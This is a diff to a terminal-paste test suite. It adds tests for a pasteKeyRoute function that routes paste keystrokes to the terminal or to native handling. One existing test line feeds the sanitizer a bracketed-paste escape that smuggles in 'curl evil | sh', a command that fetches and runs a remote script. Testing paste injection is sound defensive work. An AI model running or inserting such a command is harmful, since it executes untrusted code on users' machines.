@@ -5,6 +5,7 @@ import {
   hasUnsafeControlChars,
   isMultilinePaste,
   isSafeExternalUrl,
+  pasteKeyRoute,
   routePaste,
   sanitizePaste,
   stripTrailingNewline,
@@ -222,5 +223,23 @@ describe("flattenPaste", () => {
     expect(flattenPaste("git status\x1b[201~; curl evil | sh")).toBe(
       "git status[201~; curl evil | sh",
     );
+  });
+});
+
+describe("pasteKeyRoute", () => {
+  test("terminal focado: o TYBA cola (uma vez, pelo deliverPaste)", () => {
+    expect(pasteKeyRoute({ termFocused: true, focusIdle: false, termShown: true })).toBe("tyba");
+  });
+
+  test("foco solto no body com o terminal na tela: o TYBA cola mesmo assim", () => {
+    expect(pasteKeyRoute({ termFocused: false, focusIdle: true, termShown: true })).toBe("tyba");
+  });
+
+  test("um campo de texto focado (caixa ⌘⇧G, linha do TYBA) cola nativo", () => {
+    expect(pasteKeyRoute({ termFocused: false, focusIdle: false, termShown: true })).toBe("native");
+  });
+
+  test("foco solto sem terminal na tela (aba de arquivo, diff) não cola no escondido", () => {
+    expect(pasteKeyRoute({ termFocused: false, focusIdle: true, termShown: false })).toBe("native");
   });
 });
